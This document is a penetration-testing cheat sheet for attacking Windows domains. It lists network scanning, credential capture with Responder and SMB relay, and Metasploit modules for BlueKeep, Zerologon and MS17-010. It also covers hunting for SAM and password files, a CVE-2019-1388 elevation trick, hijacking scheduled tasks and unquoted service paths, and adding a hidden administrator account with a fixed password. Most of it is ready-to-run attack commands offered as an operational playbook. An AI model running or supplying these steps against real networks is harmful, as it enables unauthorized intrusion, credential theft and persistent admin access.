Methodologies
ipconfig /all
search for DNS Servers (There is the DC)
ping domain
$ ping domain.com
Port scanning
nmap -p- -sV 192.168.1.0/24
netdiscover
netdiscover -i eth0
netdiscover -r 192.168.1.0/24
crackmapexec
If kali use this command: crackmapexec
sudo git clone https://github.com/byt3bl33d3r/CrackMapExec
crackmapexec smb 192.168.1.0/24
Responder
sudo git clone https://github.com/lgandx/Responder.git
responder.conf → all Off
python Responder.py -I eth0 -w -F -r -d
Crackstation / hashcat if needed
SMB Relay (Impacket)
sudo git clone https://github.com/SecureAuthCorp/impacket
Bluekeep
msfconsole
search bluekeep
use 0
set rhosts 192.168.1.0/24
check
zerologon
Get netbios name from dc
msfconsole
search zerologon
use 0
set rhosts 192.168.1.30 (DC IP)
check
ms17
msfconsole
search ms17
use 3
set rhosts 192.168.1.0/24
check
Search system with default password
Search for port 80 or 443
search in google
{system name} default password
OWA
exploits for owa
nmap NSE scripts




Hunting Password:

SAM file is file which contains all user’s password in LM hash format or NTLM hash format
C:/Windows/System32/config/SAM

If you want to find sensitive file which contains password you can try this command:
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
type file.txt


Local Privilege escalation (PE):

First let check CVE-2019-1388 - “Windows Certificate Dialog Elevation of Privilege Vulnerability”
git clone https://github.com/jas502n/CVE-2019-1388.git
Right click on HHUDP
Click on - show more details
Click on - show information about the publisher’s certificate
Click on -  Issued By
Click “OK” and “No”
After explorer open
Click file
Save as
Write in path C:/Windows/System32/cmd.exe.

Schedule Task Privilege escalation:
To find vulnerable path we can use this command:
schtasks /query /FO CSV /v | convertfrom-csv | where { $_.TaskName -ne "TaskName" } | select "TaskName","Run As User", "Task to Run"  | fl | out-string

Or use jaws tools
Jaws
https://github.com/411Hall/JAWS
powershell -ep bypass
import-module ./jaws-enum.ps1
from cmd with outFilename 
powershell -ExecutionPolicy Bypass -File ./jaws-enum.ps1 -OutputFilename Jaws.txt
search for “Schedule Task” and find what file we can replace.
Example:
we found task called : \Microsoft\Windows\test
and the “Run as user” is administrator or System. We will go to the path in “Task To Run” and check if we have permission to write and change files there.
the file need to be *.bat / *.exe / *.py or something we can run commands to create new users. 

WinPeas
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASbat
winpeas.bat
PowerUp
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 
import-module ./PowerUp.ps1
Invoke-AllChecks
Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.
powershell -ep bypass
import-module ./Sherlock.ps1
Find-AllVulns

Unquoted Service Path:

How to find Unquoted Service Path?
Open powershell and use this command:
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """'

Or use JAWS with this command : 
powershell -ExecutionPolicy Bypass -File ./jaws-enum.ps1 -OutputFilename Jaws.txt
search “Unquoted Service Path” section in file ‘Jaws.txt’
Create new user


Add user Admin:

Create new user → net user /add sahar Aa121212
Add to administrator group → net localgroup administrators sahar /add

System Info:

If you want to check version / domain and other information about the machine, open powershell and write there systeminfo 

After we get the information we need go to https://exploit-db.com and search something like “windows 2016 privi” and mark in V the ”Verified” section.

Open powershell for check when was the last update to KB with : 
wmic qfe
You need to see the InstalledOn section, go to google and search exploits which came out after this date.





